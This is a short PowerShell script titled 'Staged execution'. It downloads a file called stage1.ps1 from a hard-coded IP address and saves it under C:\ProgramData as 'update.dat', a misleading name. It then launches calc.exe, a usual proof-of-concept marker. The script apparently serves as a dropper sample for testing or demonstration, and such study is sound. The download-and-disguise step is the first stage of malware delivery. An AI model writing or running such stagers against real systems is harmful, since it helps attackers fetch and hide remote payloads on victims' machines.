<# Staged execution #>
[CmdletBinding()]
param(
    [string]$Stage1Url = 'https://198.51.100.144/stage1.ps1',
    [string]$DownloadPath = "C:\ProgramData\update.dat",
    [int]$RequestTimeout = 205
)
Invoke-WebRequest -Uri $Stage1Url -OutFile $DownloadPath -UseBasicParsing
Start-Process -FilePath "calc.exe"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
